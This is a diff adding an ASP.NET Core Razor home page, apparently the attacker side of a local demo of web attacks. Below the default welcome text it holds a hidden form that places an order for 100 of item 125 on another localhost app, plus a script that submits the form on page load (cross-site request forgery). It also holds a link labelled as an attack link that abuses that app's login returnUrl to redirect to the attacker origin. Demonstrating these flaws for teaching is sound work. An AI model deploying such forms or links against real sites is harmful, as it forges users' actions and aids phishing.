@@ -1,0 +1,20 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<div class="text-center">
+    <h1 class="display-4">Welcome</h1>
+    <p>Learn about <a href="https://docs.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+</div>
+
+
+<form action="https://localhost:5003/Home/CreateOrder" method="post">
+    <label>商品ID:<input type="hidden" name="itemId" value="125" /></label>
+    <label>数量：<input type="hidden" name="count" value="100" /></label>
+    <input type="submit" value="提交" />
+</form>
+<script type="text/javascript">
+    document.forms[0].submit();
+</script>
+
+<a href="https://localhost:5003/Home/Login?returnUrl=https%3A%2F%2Flocalhost%3A5001%2FHome%2FLogin">攻击链接https://localhost:5003/Home/Login?returnUrl=https%3A%2F%2Flocalhost%3A5001%2FHome%2FLogin</a>
